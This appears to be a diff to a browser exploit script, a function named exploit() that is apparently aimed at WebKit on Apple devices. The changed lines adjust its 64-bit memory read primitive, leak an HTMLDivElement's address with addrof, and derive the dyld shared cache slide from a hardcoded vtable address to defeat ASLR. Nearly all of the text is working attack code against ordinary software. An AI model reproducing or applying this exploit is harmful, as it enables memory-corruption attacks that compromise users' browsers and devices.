@@ -501,9 +501,9 @@ function exploit(){
                 return arr;
             },
             readInt64: function(addrObj) {
-                var offset = 0;
-                var writer = this.create_writer(addrObj);
-                return writer.read_i64(offset);
+                //var offset = 0;
+                //var writer = this.create_writer(addrObj);
+                return this.read_i64(addrObj,0);
             },
             writeInt64: function(addrObj, offset, value) {
                 var writer = this.create_writer(addrObj);
@@ -526,7 +526,7 @@ function exploit(){
         log('[*] Creating the HTMLDivElement wrapper...');
         var d = document.createElement('div');
         let ad_div = addrof(d);
-        log(ad_div.lo() + ad_div.hi());
+        //log(ad_div.lo() + ad_div.hi());
         log('[+] Address of the div is '+ad_div.toString(16));
         let exe_ptr = memory.read_i64(Add(ad_div, new Int64('0x18')),0);
         log('[+] Executable instance is at '+exe_ptr.toString(16));
@@ -536,9 +536,7 @@ function exploit(){
         log('anchor' + anchor)
         var hdr = Sub(anchor, anchor.lo() & 0xfff);
         var b = [];
-        let cnt = 0;
-        var ccc = 0;
-        var vtab = 0x1B205A808;
+        //var vtab = 0x1B205A808;
         var nslide = Sub(v_tlb, vtab); 
         var slide = Sub(nslide, new Int64('0x10'));
         log('[+] That means that the dyld shared cache slide should be '+slide.toString(16));
@@ -548,7 +546,7 @@ function exploit(){
         //log('[+] Which has magic '+magic.toString(16));
         function _u32(i)
     {
-        return b2u32(this.read(i,4));
+        return b2u32(this.read(i, 4));
     }
 
     memory.u32 = _u32;
